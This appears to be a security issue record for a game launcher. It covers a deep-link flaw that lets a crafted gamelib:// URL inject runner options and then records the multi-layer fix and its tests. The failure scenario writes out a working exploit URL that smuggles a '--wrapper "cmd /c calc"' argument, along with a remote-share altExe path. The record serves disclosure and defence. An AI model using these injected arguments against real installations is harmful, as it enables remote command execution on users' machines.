---
created: 2026-10-05T00:00:00.000Z
title: "A gamelib://launch deep link passes attacker-chosen arg/altExe into legendary/gogdl/nile CLI options with no confirmation — remote command execution"
area: security
severity: critical
platform: any
ready: code
found_by: "Security review of the webview / sidecar / Rust trust boundary, 2026-10-05"
files:
  - src/backend/protocol.ts:93-102
  - src/backend/protocol.ts:134-170
  - src/backend/storeManagers/legendary/games.ts:996-1008
  - src/backend/storeManagers/legendary/library.ts:851-852
  - src/backend/storeManagers/gog/games.ts:590-592
  - src/backend/storeManagers/gog/games.ts:655-669
  - src/backend/storeManagers/nile/games.ts:401-404
  - src/backend/schemas.ts:4
  - src-tauri/src/main.rs:9500
---

## Problem

The new-style protocol URL reads `arg` (repeatable) and `altExe` from the query string
(`protocol.ts:96-102`) and, for an installed game, hands them to `launchEventCallback` with no
confirmation (the only dialog in the handler is the not-installed install prompt).

- Legendary: `games.ts:1000` joins args with spaces; `library.ts:851` re-splits them with
  `shlex.split` and pushes them straight after `appName` with no `--` separator, so they parse as
  legendary's own options. `altExe` becomes `--override-exe` (`games.ts:1007-1008`).
- gogdl (`gog/games.ts:590-592`, `:655-669`) and nile (`nile/games.ts:401-404`) do the same.
- `Path` (`schemas.ts:4`) accepts any rooted path, including UNC paths.
- The shell's `protocol_url_arg` (`main.rs:9500`) only rejects control characters, oversize URLs
  and non-`gamelib` schemes.

## Failure scenario

The user clicks a link on any web page and accepts the browser's "Open GameLib?" prompt; one game
with a guessable `appName` is installed (e.g. Epic `Fortnite`, a GOG product id).
`gamelib://launch?appName=Fortnite&runner=legendary&arg=--wrapper%20%22cmd%20/c%20calc%22` is split
into legendary options; legendary and gogdl use `parse_known_args`, so `--wrapper`, `--wine`,
`--override-exe` are accepted. On Windows (no app-side `--wrapper` later to override it) that runs
any command. `altExe=\\host\share\x.exe` alone runs an exe from a remote share. `gui=false` hides
the window during the launch.

The orchestrating session confirmed `protocol.ts` and the legendary path by reading them; the
exploit itself was not run.

## Suggested fix

- Stop honouring `arg` and `altExe` from a URL without an explicit in-app confirmation that shows
  the exact executable and arguments (safe default = decline), or drop them from the handler.
- Constrain `altExe` to the game's own listed launch options / files under its install path.
- Insert `--` before passthrough game args in all three runners' command builders so they can
  never be parsed as runner options.
- Note: confirm dialogs on Windows/Linux are only safe once
  `2026-10-05-dialog-dismiss-returns-destructive-button-on-windows-and-linux.md` is fixed.

## Provenance

Found by reading the code; no test was run (the review container had no `node_modules`). The orchestrating session re-checked the cited lines itself and the mechanism holds. Line numbers are as of `5927806` on `main`.

## Resolution (2026-10-05)

Fixed with all three layers.

**1. Confirmation (`src/backend/protocol.ts`).** For an installed non-Steam game, a URL that
carries `arg` or `altExe` now opens a warning dialog before any launch. It shows the game title,
the exact executable (or "(the game's usual executable)") and each argument on its own line.
Every value is quoted, and control, line-separator and bidi-override characters are escaped as
`\u{..}`, so an argument cannot fake a line. Buttons are `["Don't launch", "Launch"]` with
`defaultId: 0` and `cancelId: 0`. Only an explicit "Launch" (response 1) launches. **Declining
means the game does not launch at all** (under `--no-gui` the app quits, like the install-decline
path). It does not fall back to launching without the URL's args, because the user asked for
neither. A URL without `arg`/`altExe` behaves as before, with no dialog. Steam is exempt:
`dispatchSteamLaunch(appName)` never receives args or altExe. The new strings use `gamelib:` keys
with English fallbacks. No catalogue entries were added, so they render in English in every
locale for now.

**2. altExe containment.** A URL `altExe` must resolve inside `gameInfo.install.install_path`,
checked with `assertContainedPath` (`sidecar/rendererPathGuard.ts`, now its first production
caller; its docblock and its test header are updated). If it does not, the launch is refused and
logged, with no dialog. Tests cover a path outside the install folder, a `..` escape, a sibling
directory sharing the prefix (`/games/Fortnite-evil`), and a `//host/share` UNC-style path.

**3. Runner argv.** The runners' own parsers were checked first. Each was cloned at the tag
`meta/releaseTags.ts` pins (legendary 0.21.0, heroic-gogdl v1.3.0, nile v1.2.0), and its
`launch` parser was driven under Python 3.10, 3.11, 3.12 and 3.13:
- **legendary** `launch App -- --wrapper calc --override-exe x.exe -foo` gives
  `wrapper=None`, and extras are `['--wrapper','calc','--override-exe','x.exe','-foo']`: the
  `--` is consumed. Without the `--`, `--wrapper calc` sets `wrapper=calc`.
- **nile** behaves the same way: the `--` is consumed and everything after it goes to the game.
- **gogdl** does NOT consume the `--`. It parses nothing after it, but extras come back as
  `['--', '-foo', 'bar']` and `launch.py` passes them to the game's argv with
  `command.extend(unknown_args)`. A literal `--` would therefore reach every game.

Legendary and nile now put passthrough `args` last, after `--`, and only when there are any.
Legendary uses a new `LaunchCommand.gameArguments`, which `commandToArgsArray` emits after every
option. Nile's argv builder moved to `storeManagers/runnerLaunchArgv.ts` (pure, testable). The
user's settings `launcherArgs` and a launch option's parameters keep their old position.
One visible change: renderer-passed `args` now come after `launcherArgs` instead of before them.
**gogdl's builder is unchanged.** Instead, `protocol.ts` drops every URL arg starting with `-`
for `runner === 'gog'`, which also covers argparse prefix abbreviations such as `--wra=x`.
Arguments that do not start with `-` are kept and still need confirmation.

**RED (before the fix, after a behaviour-preserving extraction):** 11 of 45 failed.
- `protocol.test.ts`: "asks first" failed with `showMessageBox` 0 calls, and the altExe-refusal
  cases failed because `launchEventCallback` was called.
- `runnerLaunchArgv.test.ts`: legendary failed with `indexOf('--')` returning -1, and nile's
  expected `"--"` was missing before `--wrapper`.

**GREEN:** `protocol.test.ts`, `runnerLaunchArgv.test.ts` and `rendererPathGuard.test.ts` pass,
84/84. Related suites pass, 227/227. `pnpm codecheck` exit 0. `pnpm lint`: production PASS,
tests PASS. eslint on the touched files: 0 errors. `prettier --check` on the touched files:
clean.

**Not verified:**
- No live run on any OS. No real launch, and no runner binary was executed.
- The runner `--` behaviour was measured on the runners' Python sources with system Pythons.
  It was not measured on the frozen release binaries, whose bundled Python version is unknown;
  3.10 through 3.13 all behaved the same.
- **Esc/close on Windows and Linux:** on a base without `d6441bb` ("dismissed confirm resolves
  cancelId"), dismissing this dialog resolves as buttons[1], which is "Launch". The fix depends
  on `d6441bb`, which is on `claude/gallant-meitner-ybx0mr`. Enter and the default button are
  safe either way.
- Symlinks inside the install folder are not resolved (the containment check is lexical).
- legendary still treats a `-y`/`--yes` placed after `--` as its own flag (`cli.py` strips it
  from extras). That only auto-confirms prompts.
